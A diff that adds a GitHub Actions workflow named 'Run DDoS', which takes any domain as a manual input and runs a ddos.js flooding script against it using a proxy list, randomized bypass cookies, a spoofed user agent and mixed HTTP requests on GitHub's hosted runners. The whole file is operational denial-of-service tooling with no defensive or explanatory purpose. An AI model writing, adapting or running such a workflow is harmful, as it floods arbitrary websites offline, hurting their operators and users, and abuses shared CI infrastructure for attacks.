@@ -1,0 +1,20 @@
+name: Run DDoS
+on:
+  workflow_dispatch:
+    inputs:
+      domain:
+        description: 'Domain to DDoS'
+        required: true
+jobs:
+  ddos:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+    - name: Set up Node.js
+      uses: actions/setup-node@v3
+      with:
+        node-version: '16'
+    - name: Run DDoS
+      run: |
+        node ddos.js GET ${{ github.event.inputs.domain }} 60 10 20 proxy.txt --query 1 --cookie "bypassing=%RAND%" --ua "curl/4.0" --reset --http mix --delay 1 --debug
